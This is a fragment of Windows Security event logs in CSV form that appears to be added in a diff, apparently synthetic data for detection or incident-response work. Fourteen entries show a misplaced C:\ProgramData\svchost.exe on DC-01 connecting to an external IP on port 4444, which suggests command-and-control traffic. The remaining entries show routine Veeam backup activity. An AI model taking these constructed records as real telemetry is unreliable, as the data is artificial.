+2025-06-10 20:00:47,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:48,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:49,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:50,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:51,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:52,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:53,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:54,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:55,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:56,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:57,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:58,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:00:59,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 20:01:00,192.168.1.100,DC-01,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 22:00:00,172.16.10.60,BACKUP-01,Security,4624,Logon Type 3,User: Veeam,Source IP: 172.16.10.50,Share: \BACKUP-01\Backup
+2025-06-10 22:00:01,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:02,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:03,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:04,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:05,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:06,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:07,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:08,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:09,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:10,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:11,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:12,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:13,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:14,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:15,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:16,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:17,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:18,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:19,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:20,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:21,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:22,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:23,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:24,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 22:00:25,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
